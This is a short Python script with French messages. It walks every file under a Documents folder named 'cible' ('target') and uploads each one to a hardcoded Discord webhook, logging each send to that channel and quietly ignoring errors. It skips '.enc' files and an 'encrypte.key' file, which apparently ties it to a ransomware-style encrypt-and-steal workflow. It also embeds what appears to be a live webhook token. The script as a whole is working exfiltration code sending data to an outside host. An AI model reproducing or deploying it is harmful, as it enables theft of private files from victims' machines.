import os
import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1372188579903701043/BGMMGf0U6NUcbZ9X7dR76FdDPQ1rb0yOOeCLHj49BYyi2pb5OPmNSQa_Gi4_5bs3AMv8"
DIRECTORY = os.path.join(os.environ["USERPROFILE"], "OneDrive", "Documents", "cible")

def log_discord(message):
    """Envoie un message texte simple via le webhook Discord."""
    try:
        requests.post(WEBHOOK_URL, data={"content": message})
    except Exception as e:
        # Si même ça échoue, on ne peut rien faire
        pass

def upload_file(file_path):
    try:
        with open(file_path, "rb") as f:
            filename = os.path.basename(file_path)
            log_discord(f"🔄 Envoi de : {filename}")
            response = requests.post(WEBHOOK_URL, files={"file": (filename, f)})
            if response.status_code == 204:
                log_discord(f"✅ Envoyé : {filename}")
            else:
                log_discord(f"❌ Erreur envoi {filename} (code HTTP: {response.status_code})")
    except Exception as e:
        log_discord(f"❌ Exception lors de l'envoi de {file_path} : {e}")


def upload_all_files(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if not file.endswith(".enc") and file != "encrypte.key":
                upload_file(file_path)

if __name__ == "__main__":
    log_discord("📤 Démarrage du bot Discord")
    upload_all_files(DIRECTORY)
